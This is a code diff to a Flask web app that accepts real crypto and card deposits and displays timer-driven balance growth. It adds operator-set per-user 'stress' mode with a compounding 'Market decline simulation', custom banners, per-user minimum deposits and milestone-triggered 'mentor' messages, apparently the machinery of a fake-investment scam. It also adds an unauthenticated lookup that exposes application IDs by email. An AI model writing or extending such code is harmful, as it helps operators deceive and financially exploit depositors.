@@ -179,9 +179,52 @@ def admin_required(f):
 
 
 # ---- Helper Functions ----
+def apply_decline(user):
+    """Applies compounding decline to user's balance based on risk stress active flags."""
+    if not hasattr(user, 'risk_stress_active') or not user.risk_stress_active:
+        return
+    now = _now()
+    if not user.last_decline_at:
+        user.last_decline_at = user.created_at or now
+        db.session.commit()
+    
+    delta = (now - user.last_decline_at).total_seconds()
+    interval = user.decline_interval or 10
+    if delta >= interval and user.balance > 0:
+        intervals_passed = int(delta // interval)
+        total_decline = 0
+        current_balance = user.balance
+        decline_rate_val = user.decline_rate or 0.0
+        for _ in range(intervals_passed):
+            decline_amount = current_balance * (decline_rate_val / 100.0)
+            current_balance -= decline_amount
+            total_decline += decline_amount
+        
+        if total_decline > 0:
+            user.balance = max(0.0, current_balance)
+            db.session.add(Transaction(
+                user_id=user.id,
+                amount=-total_decline,
+                type='growth',
+                description='Market decline simulation'
+            ))
+        user.last_decline_at = user.last_decline_at + timedelta(seconds=intervals_passed * interval)
+        db.session.commit()
+
+
 def apply_growth(user):
     """Apply growth to user's balance if enough time has passed."""
     now = _now()
+    if hasattr(user, 'risk_stress_active') and user.risk_stress_active:
+        apply_decline(user)
+        # Check milestones and send scheduled messages
+        try:
+            check_balance_milestones(user)
+            check_and_send_scheduled_mentor_messages(user)
+        except Exception as e:
+            print("Error checking mentor milestones during stress test:", e)
+        return
+
     delta = (now - user.last_growth).total_seconds()
     if delta >= 3.0 and user.balance > 0:
         growth = calculate_growth(user.balance, user.last_growth)
@@ -442,6 +485,12 @@ def referral_redirect(code):
     return redirect(url_for('waiting_list_apply_view', ref=code.upper()))
 
 
+@app.route('/application/status')
+def waiting_list_search_view():
+    """Render waitlist application status search page."""
+    return render_template('status.html', application=None)
+
+
 @app.route('/application/status/<int:app_id>')
 def waiting_list_status_view(app_id):
     """Render waitlist application status page."""
@@ -449,6 +498,29 @@ def waiting_list_status_view(app_id):
     if not app_entry:
         return redirect(url_for('waiting_list_apply_view'))
     return render_template('status.html', application=app_entry)
+
+
+@app.route('/api/application/search')
+def waiting_list_search_api():
+    """Search for waitlist application by ID or email."""
+    q = request.args.get('q', '').strip()
+    if not q:
+        return jsonify({'success': False, 'message': 'Search query is required.'}), 400
+    
+    app_entry = None
+    if q.isdigit():
+        app_entry = db.session.get(WaitingList, int(q))
+    
+    if not app_entry:
+        app_entry = WaitingList.query.filter_by(email=q).first()
+        
+    if not app_entry:
+        return jsonify({'success': False, 'message': 'No application found with that ID or email address.'}), 404
+        
+    return jsonify({
+        'success': True,
+        'application_id': app_entry.id
+    })
 
 
 @app.before_request
@@ -459,6 +531,7 @@ def restrict_unapproved_users():
         'index', 'login', 'logout', 'register', 'waiting_list_apply',
         'waiting_list_spots', 'waiting_list_status', 'static',
         'waiting_list_apply_view', 'waiting_list_status_view',
+        'waiting_list_search_view', 'waiting_list_search_api',
         'admin_setup', 'admin_dashboard', 'admin_stats', 'admin_withdrawals',
         'admin_approve_withdrawal', 'admin_reject_withdrawal', 'admin_mark_paid',
         'admin_withdrawal_stats', 'admin_waiting_list_applications',
@@ -868,7 +941,11 @@ def get_balance():
         'profit': round(profit, 2),
         'roi': round(roi, 1),
         'growth_today': round(growth_today, 2),
-        'growth_percent': round((growth_today / invested * 100) if invested > 0 else 0, 1)
+        'growth_percent': round((growth_today / invested * 100) if invested > 0 else 0, 1),
+        'risk_stress_active': bool(getattr(user, 'risk_stress_active', False)),
+        'risk_banner_message': getattr(user, 'risk_banner_message', '') or '',
+        'chat_mode': getattr(user, 'chat_mode', 'auto') or 'auto',
+        'custom_minimum_deposit': getattr(user, 'custom_minimum_deposit', None)
     })
 
 @app.route('/api/activity')
@@ -1023,8 +1100,9 @@ def create_crypto_payment():
     amount_usd = float(data.get('amount', 0))
     method = data.get('method', 'crypto-usdt')
 
-    if amount_usd < MINIMUM_DEPOSIT:
-        return jsonify({'success': False, 'message': f'Minimum deposit is ${MINIMUM_DEPOSIT:.2f}'})
+    min_dep = current_user.custom_minimum_deposit if (hasattr(current_user, 'custom_minimum_deposit') and current_user.custom_minimum_deposit is not None) else MINIMUM_DEPOSIT
+    if amount_usd < min_dep:
+        return jsonify({'success': False, 'message': f'Minimum deposit is ${min_dep:.2f}'})
 
     # Map frontend method to NowPayments currency code
     currency_map = {
@@ -1209,8 +1287,9 @@ def deposit_card():
 
     data = request.get_json(silent=True) or {}
     amount = float(data.get('amount', 0) or 0)
-    if amount < MINIMUM_DEPOSIT:
-        return jsonify({'success': False, 'message': f'Minimum deposit is ${MINIMUM_DEPOSIT:.2f}'})
+    min_dep = current_user.custom_minimum_deposit if (hasattr(current_user, 'custom_minimum_deposit') and current_user.custom_minimum_deposit is not None) else MINIMUM_DEPOSIT
+    if amount < min_dep:
+        return jsonify({'success': False, 'message': f'Minimum deposit is ${min_dep:.2f}'})
 
     exchange_rate = get_usd_to_ngn_rate()
     ngn_amount = round(amount * exchange_rate, 2)
@@ -3217,7 +3296,14 @@ with app.app_context():
         ("invitation_code", "VARCHAR(50)"),
         ("invitation_expires_at", "DATETIME"),
         ("mentor_id", "INTEGER"),
-        ("milestones_sent", "TEXT DEFAULT '[]'")
+        ("milestones_sent", "TEXT DEFAULT '[]'"),
+        ("risk_stress_active", "BOOLEAN DEFAULT 0"),
+        ("decline_rate", "DOUBLE DEFAULT 0.00"),
+        ("decline_interval", "INTEGER DEFAULT 10"),
+        ("last_decline_at", "DATETIME"),
+        ("risk_banner_message", "TEXT"),
+        ("custom_minimum_deposit", "DOUBLE"),
+        ("chat_mode", "VARCHAR(20) DEFAULT 'auto'")
     ]
     for col_name, col_type in new_user_cols:
         try:
